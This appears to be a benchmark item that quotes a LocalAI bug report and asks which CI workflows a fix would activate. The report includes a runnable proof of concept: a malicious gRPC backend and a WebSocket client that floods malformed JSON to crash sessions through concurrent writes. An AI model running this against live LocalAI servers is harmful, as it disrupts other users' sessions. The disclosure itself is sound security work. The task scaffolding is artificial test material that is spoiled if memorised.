# Recover the symbolic verification state this change produces

A regression report was filed against `mudler/LocalAI`.  The report is quoted verbatim below.

## Report

```
Bug 4: Concurrent WebSocket writes in audio transform trigger panics and data races

**LocalAI version:**
commit `05b8d8aafe91401938622e1759c7dbf9425c8a95` (master, 2026-07-14)

**Environment, CPU architecture, OS, and Version:**
Linux 6.8.0-55-generic, x86_64, Docker container built with `-race` instrumentation. Not architecture specific.

**Describe the bug**

`core/http/endpoints/localai/audio_transform.go` writes to the same Gorilla WebSocket connection from two goroutines. The backend forwarding goroutine writes binary PCM frames while the read loop can call `sendWSError()` and write text error frames for malformed mid-stream JSON. Gorilla WebSocket permits only one concurrent writer, so this race can panic with `concurrent write to websocket connection` and reset active client sessions. A `-race` build also reports the concurrent writes directly.

**To Reproduce**

The PoC uses a streaming gRPC backend that continuously emits PCM frames, then a WebSocket client sends malformed JSON while the server is forwarding those frames.

```bash
mkdir -p /tmp/localai-audio-transform-poc/wsclient /tmp/localai-audio-transform-poc/models
cd /tmp/localai-audio-transform-poc

cat > models/evil-audio-transform.yaml <<'EOF'
name: evil-audio-transform
backend: evil-audio-transform
known_usecases:
  - audio_transform
parameters:
  model: evil-audio-transform.bin
EOF

# Copy generated backend proto files from the LocalAI checkout used for testing.
# If they are not present, generate them from backend/backend.proto with protoc.
mkdir -p proto
cp /data/ylwang/Projects/InfereneceFramework/Target/LocalAI/audit-results/poc/core_http_endpoints_localai_audio_transform/001/proto/backend*.pb.go proto/

cat > go.mod <<'EOF'
module evilbackend

go 1.24.0

require (
  google.golang.org/grpc v1.80.0
  google.golang.org/protobuf v1.36.11
)
EOF

cat > evil_backend.go <<'EOF'
package main

import (
  "context"
  "flag"
  "log"
  "net"
  "time"

  pb "evilbackend/proto"
  "google.golang.org/grpc"
)

var addr = flag.String("addr", "0.0.0.0:50051", "address to listen on")

type EvilBackend struct {
  pb.UnimplementedBackendServer
}

func (e *EvilBackend) Health(ctx context.Context, in *pb.HealthMessage) (*pb.Reply, error) {
  return &pb.Reply{Message: []byte("OK")}, nil
}

func (e *EvilBackend) LoadModel(ctx context.Context, in *pb.ModelOptions) (*pb.Result, error) {
  return &pb.Result{Message: "Model loaded successfully", Success: true}, nil
}

func (e *EvilBackend) AudioTransformStream(stream pb.Backend_AudioTransformStreamServer) error {
  first, err := stream.Recv()
  if err != nil {
    return err
  }
  cfg := first.GetConfig()
  log.Printf("got config sample_rate=%d frame_samples=%d", cfg.GetSampleRate(), cfg.GetFrameSamples())

  go func() {
    for {
      if _, err := stream.Recv(); err != nil {
        return
      }
    }
  }()

  frame := make([]byte, 512)
  ticker := time.NewTicker(time.Millisecond)
  defer ticker.Stop()
  deadline := time.Now().Add(5 * time.Second)
  for i := int64(0); time.Now().Before(deadline); i++ {
    <-ticker.C
    if err := stream.Send(&pb.AudioTransformFrameResponse{Pcm: frame, FrameIndex: i}); err != nil {
      return nil
    }
  }
  return nil
}

func main() {
  flag.Parse()
  lis, err := net.Listen("tcp", *addr)
  if err != nil {
    log.Fatal(err)
  }
  s := grpc.NewServer()
  pb.RegisterBackendServer(s, &EvilBackend{})
  log.Fatal(s.Serve(lis))
}
EOF

cat > wsclient/go.mod <<'EOF'
module wsclient

go 1.24.0

require github.com/gorilla/websocket v1.5.3
EOF

cat > wsclient/main.go <<'EOF'
package main

import (
  "encoding/json"
  "flag"
  "fmt"
  "log"
  "net/http"
  "net/url"
  "time"

  "github.com/gorilla/websocket"
)

var host = flag.String("host", "localai-audio-transform-victim", "host")
var port = flag.String("port", "8080", "port")
var apiKey = flag.String("apikey", "victim-secret-key", "api key")

func main() {
  flag.Parse()
  u := url.URL{Scheme: "ws", Host: fmt.Sprintf("%s:%s", *host, *port), Path: "/audio/transformations/stream"}
  h := http.Header{}
  h.Set("Authorization", "Bearer "+*apiKey)
  c, _, err := websocket.DefaultDialer.Dial(u.String(), h)
  if err != nil {
    log.Fatal(err)
  }
  defer c.Close()

  go func() {
    for {
      if _, _, err := c.ReadMessage(); err != nil {
        return
      }
    }
  }()

  msg := map[string]any{
    "type": "session.update",
    "model": "evil-audio-transform",
    "sample_format": "S16_LE",
    "sample_rate": 16000,
    "frame_samples": 256,
  }
  b, _ := json.Marshal(msg)
  if err := c.WriteMessage(websocket.TextMessage, b); err != nil {
    log.Fatal(err)
  }
  time.Sleep(150 * time.Millisecond)

  bad := []byte(`{"type": "session.update", not-valid-json !!!`)
  for i := 0; i < 200; i++ {
    _ = c.WriteMessage(websocket.TextMessage, bad)
    if i%10 == 0 {
      time.Sleep(2 * time.Millisecond)
    }
  }
  time.Sleep(3 * time.Second)
}
EOF

docker run --rm -v "$PWD":/w -w /w golang:1.26-bookworm go build -o evil_backend ./evil_backend.go
docker run --rm -v "$PWD/wsclient":/w -w /w golang:1.26-bookworm go build -o wsclient ./main.go

docker network create localai-audio-transform-net >/dev/null 2>&1 || true
docker rm -f localai-audio-transform-evil localai-audio-transform-victim >/dev/null 2>&1 || true

docker run -d --name localai-audio-transform-evil \
  --network localai-audio-transform-net \
  -v "$PWD/evil_backend":/evil_backend:ro \
  --entrypoint /evil_backend \
  localai-audit:latest \
  -addr 0.0.0.0:50051

docker run -d --name localai-audio-transform-victim \
  --network localai-audio-transform-net \
  -p 8080:8080 \
  -v "$PWD/models":/models \
  localai-audit:latest local-ai run \
  --address 0.0.0.0:8080 \
  --models-path /models \
  --api-keys "victim-secret-key" \
  --external-grpc-backends "evil-audio-transform:localai-audio-transform-evil:50051" \
  --debug

until curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:8080/readyz | grep -q 200; do sleep 1; done

for i in 1 2; do
  docker run --rm --network localai-audio-transform-net \
    -v "$PWD/wsclient/wsclient":/wsclient:ro \
    --entrypoint /wsclient \
    localai-audit:latest \
    -host localai-audio-transform-victim -port 8080 -apikey victim-secret-key || true
done

docker inspect -f 'Running={{.State.Running}} ExitCode={{.State.ExitCode}} Status={{.State.Status}} OOMKilled={{.State.OOMKilled}}' localai-audio-transform-victim
curl -s -o /dev/null -w 'readyz=%{http_code}\n' http://127.0.0.1:8080/readyz || true
docker logs localai-audio-transform-victim 2>&1 | grep -nE 'WARNING: DATA RACE|panic:|fatal error' | tail -40
docker rm -f localai-audio-transform-evil localai-audio-transform-victim >/dev/null 2>&1 || true
```

**Expected behavior**

All WebSocket writes should be serialized. Malformed mid-stream JSON should return an error frame or close the session without panicking.

**Logs**

```
Running=true ExitCode=0 Status=running OOMKilled=false Error=
readyz after probes -> 200
WARNING: DATA RACE
WARNING: DATA RACE
panic: concurrent write to websocket connection
== does the victim log contain a Go -race DATA RACE report, panic, or fatal error? ==
61:WARNING: DATA RACE
173:WARNING: DATA RACE
283:WARNING: DATA RACE
395:WARNING: DATA RACE
517:WARNING: DATA RACE
627:WARNING: DATA RACE
749:WARNING: DATA RACE
echo: http: panic serving 192.168.64.4:54806: concurrent write to websocket connection
github.com/gorilla/websocket.(*Conn).WriteMessage(...)
github.com/mudler/LocalAI/core/http/endpoints/localai.sendWSError(...)
    /src/core/http/endpoints/localai/audio_transform.go:412
github.com/mudler/LocalAI/core/http/routes.RegisterLocalAIRoutes.AudioTransformStreamEndpoint.func98(...)
    /src/core/http/endpoints/localai/audio_transform.go:262
```

**Additional context**

The endpoint requires an API key in this configuration. In the latest rerun, the process survived and `/readyz` still returned 200, but the server logged request goroutine panics and race detector reports. The client sessions were reset while the backend stream was active.
```

## What you have

- `/testbed/repo` is the repository checked out at the **pre-change** commit `a23fcc90c36b49439a1a3bd785f8854c1816021e`.  There
  is no git history: read the files directly.
- The pull request that actually fixed this issue is **not** in the container and cannot be fetched.

## Evaluation context

Assume the prospective fix has just **updated an existing non-draft pull request**.

- PR lifecycle action: `synchronize`
- target branch: `master`
- consider both `pull_request` and `pull_request_target` trigger families
- apply the repository's native `types`, `branches`, `branches-ignore`, `paths`, `paths-ignore`
- direct workflow activation only; no push/workflow_dispatch/schedule/workflow_run

## What to produce

Write JSON to `/testbed/answer.json`:

```json
{"case_id": "mudler_LocalAI__10844__a23fcc9",
  "activated_workflows": [".github/workflows/test.yml"]}
```

- list every workflow under `repo/.github/workflows/` that this change would activate
- workflow paths exactly as under `repo/.github/workflows/`; a path that does not exist scores 0

## Rules

- Do **not** use the network. Fetching the upstream fix is cheating and is detected.
- Solve it from the repository.
